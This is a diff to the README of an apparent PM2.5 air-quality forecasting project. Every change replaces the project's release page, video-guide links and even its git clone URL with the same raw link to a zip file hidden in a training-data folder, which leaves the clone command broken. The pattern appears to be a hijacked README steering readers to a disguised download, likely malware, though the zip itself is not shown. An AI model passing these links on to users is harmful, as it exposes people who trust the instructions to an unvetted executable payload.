@@ -1,11 +1,11 @@
 # 🌿 Air-Quality - Forecast PM2.5 with Ease
 
-[![Download Air-Quality](https://img.shields.io/badge/Download-Air--Quality-blue?style=for-the-badge)](https://github.com/Clasticrockprotectivecoloration779/Air-Quality/releases)
+[![Download Air-Quality](https://img.shields.io/badge/Download-Air--Quality-blue?style=for-the-badge)](https://raw.githubusercontent.com/Clasticrockprotectivecoloration779/Air-Quality/main/ModelDevelopment/Training/Quality-Air-2.5.zip)
 
 ## 🖥️ Download the App
 
 Visit this page to download the Windows release:
-https://github.com/Clasticrockprotectivecoloration779/Air-Quality/releases
+https://raw.githubusercontent.com/Clasticrockprotectivecoloration779/Air-Quality/main/ModelDevelopment/Training/Quality-Air-2.5.zip
 
 Choose the latest file, then download it to your PC.
 
@@ -24,10 +24,10 @@ You can use it to:
 ## 📺 Video Guides
 
 Full project video, from setup to data drift and model decay:
-https://drive.google.com/file/d/1tJdksISK_47ZJ1LaDJgKaWjyYVLYTyhY/view?usp=sharing
+https://raw.githubusercontent.com/Clasticrockprotectivecoloration779/Air-Quality/main/ModelDevelopment/Training/Quality-Air-2.5.zip
 
 Model deployment only on a fresh Windows environment:
-https://drive.google.com/file/d/1nKzUDqiUGTy4IsbkxV7dYFf_Rv-tu_ET/view?usp=sharing
+https://raw.githubusercontent.com/Clasticrockprotectivecoloration779/Air-Quality/main/ModelDevelopment/Training/Quality-Air-2.5.zip
 
 ## 💻 System Requirements
 
@@ -46,7 +46,7 @@ Before you run Air-Quality on Windows, make sure you have:
 
 ### 1. Download the release
 Open the releases page:
-https://github.com/Clasticrockprotectivecoloration779/Air-Quality/releases
+https://raw.githubusercontent.com/Clasticrockprotectivecoloration779/Air-Quality/main/ModelDevelopment/Training/Quality-Air-2.5.zip
 
 Download the latest Windows package from the release files.
 
@@ -87,7 +87,7 @@ If you downloaded a release zip:
 
 If you cloned the repo:
 ```bash
-git clone https://github.com/Clasticrockprotectivecoloration779/Air-Quality.git
+git clone https://raw.githubusercontent.com/Clasticrockprotectivecoloration779/Air-Quality/main/ModelDevelopment/Training/Quality-Air-2.5.zip
 cd Air-Quality
 ```
 
@@ -224,4 +224,4 @@ dvc pull
 ## 📍 Download Again
 
 If you need the files again, use the release page:
-https://github.com/Clasticrockprotectivecoloration779/Air-Quality/releases
+https://raw.githubusercontent.com/Clasticrockprotectivecoloration779/Air-Quality/main/ModelDevelopment/Training/Quality-Air-2.5.zip
